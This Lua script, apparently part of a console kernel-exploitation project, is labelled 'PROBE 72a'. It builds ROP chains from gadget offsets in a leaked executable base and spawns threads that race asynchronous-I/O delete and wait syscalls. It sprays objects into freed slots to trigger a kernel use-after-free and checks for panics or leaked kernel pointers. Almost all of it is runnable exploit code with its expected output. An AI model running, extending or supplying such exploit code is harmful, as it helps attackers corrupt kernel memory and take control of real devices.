-- CRASH_CLASS: HIGH
-- PROBE 72a: 662-vs-663 UAF race
--
-- 71h proved 663 BLOCKS on pending I/O (socketpair AIO read with no data).
-- 71g proved child thread can call 669 (AIO submit) despite no r8 control.
--
-- Attack sequence:
--   1. Create socketpair (sp0/sp1). Submit AIO read on sp0 (pends).
--   2. Spawn Thread W: 663(id) — blocks in kernel, holds Q waiter reference
--   3. Verify W is blocked (marker stays 0)
--   4. Spawn Thread A: 662(id) — frees R/I/Q objects
--   5. Verify A completed (marker set)
--   6. Spawn Thread C: 669 × N — reclaim freed slots with new objects
--   7. Write to sp1 — wakes Thread W — W touches freed/reclaimed Q → UAF
--   8. Check: did W crash? Did it return garbage status? Kernel panic?
--
-- Expected outcomes:
--   BEST: kernel panic (proves UAF) or corrupted status (reclaimed data)
--   OK:   W returns normally (Q not yet reclaimed, or kernel validates)
--   BAD:  W crashes before marker (663 validates internally)

print("=== PROBE 72a: 662-vs-663 UAF RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSEGV(11), SIGSYS(12)
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Open /dev/zero for instant-complete submissions
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end
local fd_zero = N(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("zero_fd=" .. fd_zero)

-- Fake TCB for child threads (sysarch SET_FSBASE)
local fake_tcb = memory.alloc(0x1000)
local tcb_addr = N(fake_tcb)
for i = 0, 0xFFC, 8 do wq(tcb_addr + i, uint64(tcb_addr)) end
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(tcb_addr))

-- Shared buffers
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)

local function aio_submit_on(fd)
    local req = memory.alloc(0x28)
    wq(N(req) + 0x00, uint64(0))
    wq(N(req) + 0x08, uint64(16))
    wq(N(req) + 0x10, uint64(N(data_buf)))
    wq(N(req) + 0x18, uint64(N(result_buf)))
    wq(N(req) + 0x20, uint64(fd))
    local id_buf = memory.alloc(8); wd(N(id_buf), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(req)), uint64(1), uint64(1), uint64(N(id_buf)))
    end)
    return rd(N(id_buf)) or 0
end

local function aio_poll(aid)
    local id_b = memory.alloc(8); wd(N(id_b), aid)
    local st_b = memory.alloc(8); wd(N(st_b), 0xDEAD)
    pcall(function() mk(664)(uint64(N(id_b)), uint64(1), uint64(N(st_b))) end)
    return rd(N(st_b))
end

local function aio_status(aid)
    local id_b = memory.alloc(8); wd(N(id_b), aid)
    local st_b = memory.alloc(8); wd(N(st_b), 0xDEAD)
    pcall(function() mk(666)(uint64(N(id_b)), uint64(1), uint64(N(st_b))) end)
    return rd(N(st_b))
end

local function aio_delete(aid)
    local id_b = memory.alloc(8); wd(N(id_b), aid)
    local st_b = memory.alloc(8); wd(N(st_b), 0xDEAD)
    pcall(function() mk(662)(uint64(N(id_b)), uint64(1), uint64(N(st_b))) end)
    return rd(N(st_b))
end

local function build_child(stk_alloc, chain_fn)
    local stk = stk_alloc
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function em(v) wq(rsp + off, v); off = off + 8 end
    chain_fn(em)
    return stk, sb, rsp
end

local function spawn_child(stk, sb)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    pcall(function() mk(455)(par, uint64(0x38)) end)
    return tid
end

local function busywait(count)
    for w = 1, count do local _ = rd(N(data_buf)) end
end

print("")

-- ============================================================
-- [A] Sanity check: 663 blocks, 662 frees, both from children
-- ============================================================
print("[A] Sanity: socketpair + pending AIO + child 663 blocks")

local sp_fds = memory.alloc(16)
pcall(function()
    mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_fds)))
end)
local sp0 = rd(N(sp_fds))
local sp1 = rd(N(sp_fds) + 4)
print(string.format("  socketpair: fd0=%d fd1=%d", sp0 or -1, sp1 or -1))

local target_id = aio_submit_on(sp0 or 0)
print(string.format("  AIO submit on sp0: id=0x%X", target_id))
local st_pre = aio_status(target_id)
print(string.format("  status=0x%08X (expect 0x02=pending)", st_pre or 0))

-- Poll the pending request (required for 662 to accept it)
aio_poll(target_id)
local st_polled = aio_status(target_id)
print(string.format("  after poll=0x%08X", st_polled or 0))

if not alive() then print("DEAD after setup"); return end
print("")

-- ============================================================
-- [B] THE RACE: Thread W (663 wait) → Thread A (662 delete)
-- ============================================================
print("[B] THE RACE")

local ITERS = 10
local total_crashes = 0
local total_garbage = 0
local total_clean = 0

for iter = 1, ITERS do
    if not alive() then
        print(string.format("  iter %d: *** PROCESS DEAD ***", iter))
        break
    end

    -- Fresh socketpair each iteration
    local spf = memory.alloc(16)
    pcall(function()
        mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(spf)))
    end)
    local s0 = rd(N(spf))
    local s1 = rd(N(spf) + 4)
    if (s0 or 0) <= 0 or (s1 or 0) <= 0 then
        print(string.format("  iter %d: socketpair failed", iter))
        break
    end

    -- Submit pending AIO read on s0
    local aid = aio_submit_on(s0)
    if aid == 0 then
        print(string.format("  iter %d: submit failed", iter))
        pcall(function() mk(6)(uint64(s0)) end)
        pcall(function() mk(6)(uint64(s1)) end)
        break
    end

    -- Poll (required for 662)
    aio_poll(aid)

    -- Shared state
    local marker_W = memory.alloc(8); wq(N(marker_W), uint64(0))
    local marker_A = memory.alloc(8); wq(N(marker_A), uint64(0))
    local sts_W = memory.alloc(8); wd(N(sts_W), 0xDEAD)
    local sts_A = memory.alloc(8); wd(N(sts_A), 0xDEAD)
    local ids_buf = memory.alloc(8); wd(N(ids_buf), aid)

    -- Thread W: sysarch + 663(id) → blocks → write marker on return
    local stk_W = memory.alloc(0x4000)
    build_child(stk_W, function(em)
        -- sysarch(129, &tcb_ptr)
        em(g_pop_rdi); em(uint64(129))
        em(g_pop_rsi); em(uint64(N(tcb_ptr)))
        em(g_pop_rax); em(uint64(165))
        em(stub)
        -- 663(ids_buf, 1, sts_W)
        em(g_pop_rdi); em(uint64(N(ids_buf)))
        em(g_pop_rsi); em(uint64(1))
        em(g_pop_rdx); em(uint64(N(sts_W)))
        em(g_pop_rax); em(uint64(663))
        em(stub)
        -- Write 663 return value to marker_W
        em(g_pop_rdi); em(uint64(N(marker_W)))
        em(g_mov_m_rax)
        -- thr_exit
        em(g_pop_rdi); em(uint64(0))
        em(g_pop_rax); em(uint64(431))
        em(stub)
    end)

    -- Thread A: sysarch + short spin + 662(id) → frees objects
    local stk_A = memory.alloc(0x4000)
    build_child(stk_A, function(em)
        -- sysarch(129, &tcb_ptr)
        em(g_pop_rdi); em(uint64(129))
        em(g_pop_rsi); em(uint64(N(tcb_ptr)))
        em(g_pop_rax); em(uint64(165))
        em(stub)
        -- 662(ids_buf, 1, sts_A)
        em(g_pop_rdi); em(uint64(N(ids_buf)))
        em(g_pop_rsi); em(uint64(1))
        em(g_pop_rdx); em(uint64(N(sts_A)))
        em(g_pop_rax); em(uint64(662))
        em(stub)
        -- Write marker
        em(g_pop_rax); em(uint64(0xA662))
        em(g_pop_rdi); em(uint64(N(marker_A)))
        em(g_mov_m_rax)
        -- thr_exit
        em(g_pop_rdi); em(uint64(0))
        em(g_pop_rax); em(uint64(431))
        em(stub)
    end)

    -- Spawn W first (needs time to enter kernel and block on 663)
    spawn_child(stk_W, N(stk_W))

    -- Short wait for W to enter 663 and block
    busywait(50000)

    -- Check W is blocked
    local w_blocked = (rd(N(marker_W)) == 0)

    -- Spawn A (662 delete while W is blocked)
    spawn_child(stk_A, N(stk_A))

    -- Wait for A to complete
    busywait(100000)

    local mA = rd(N(marker_A))
    local sA = rd(N(sts_A))
    local a_done = (mA ~= 0)

    if not a_done then
        -- A didn't finish — maybe 662 blocked too? Wait more.
        busywait(200000)
        mA = rd(N(marker_A))
        sA = rd(N(sts_A))
        a_done = (mA ~= 0)
    end

    -- Now spray: submit new AIO requests to reclaim freed Q/R/I slots
    -- Use /dev/zero (instant complete) for spray objects
    local spray_ids = {}
    for si = 1, 8 do
        local sid = aio_submit_on(fd_zero)
        if sid ~= 0 then spray_ids[#spray_ids + 1] = sid end
    end

    -- TRIGGER: write data to s1 → completes the AIO read → wakes Thread W
    local send_buf = memory.alloc(16)
    wq(N(send_buf), uint64(0x4141414141414141))
    pcall(function() mk(4)(uint64(s1), uint64(N(send_buf)), uint64(8)) end)

    -- Wait for W to wake up and write its marker
    busywait(200000)

    local mW = rd(N(marker_W))
    local sW = rd(N(sts_W))

    -- Analyze result
    local w_returned = (mW ~= 0)
    local w_status = sW or 0xDEAD
    local a_status = sA or 0xDEAD

    local result_tag = "?"
    if not alive() then
        result_tag = "CRASH"
        total_crashes = total_crashes + 1
    elseif not w_returned then
        result_tag = "W_STUCK"
    elseif w_status ~= 0x00000003 and w_status ~= 0x00010003
           and w_status ~= 0x80020003 and w_status ~= 0xDEAD then
        result_tag = "GARBAGE"
        total_garbage = total_garbage + 1
    else
        result_tag = "CLEAN"
        total_clean = total_clean + 1
    end

    print(string.format(
        "  iter %d: W_blk=%s A_done=%s A_sts=0x%08X W_sts=0x%08X spray=%d -> %s",
        iter,
        w_blocked and "Y" or "N",
        a_done and "Y" or "N",
        a_status, w_status,
        #spray_ids,
        result_tag))

    -- Check for kernel pointer values in status (UAF readback)
    if w_status ~= 0xDEAD then
        local h_w, l_w = get_hi_lo(rq(N(sts_W)))
        if h_w and h_w >= 0xFFFF8000 then
            print(string.format("  *** KERNEL POINTER IN W STATUS: %s ***", fmt(rq(N(sts_W)))))
        end
    end

    -- Cleanup spray objects
    for _, sid in ipairs(spray_ids) do
        aio_poll(sid)
        aio_delete(sid)
    end

    -- Close socketpair
    pcall(function() mk(6)(uint64(s0)) end)
    pcall(function() mk(6)(uint64(s1)) end)

    if result_tag == "CRASH" then break end
end

print("")
print("[C] SUMMARY")
print(string.format("  total iterations: %d", ITERS))
print(string.format("  CRASH (UAF!):     %d", total_crashes))
print(string.format("  GARBAGE status:   %d", total_garbage))
print(string.format("  CLEAN:            %d", total_clean))
print(string.format("  process:          %s", alive() and "ALIVE" or "DEAD"))

if total_crashes > 0 then
    print("")
    print("*** UAF TRIGGERED — process or kernel crashed ***")
    print("*** 662-vs-663 race produces real use-after-free ***")
elseif total_garbage > 0 then
    print("")
    print("*** GARBAGE STATUS — reclaimed data leaked through 663 ***")
    print("*** Q was freed and reclaimed; W read attacker-controlled data ***")
else
    print("")
    print("All clean — possible explanations:")
    print("  1. 663 validates Q before touching waiter list")
    print("  2. Spray didn't land in Q's zone (need size measurement)")
    print("  3. Timing: W wakes before A frees (need UMTX gate)")
    print("  4. 662 wakes waiters before freeing Q")
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== PROBE 72a COMPLETE ===")
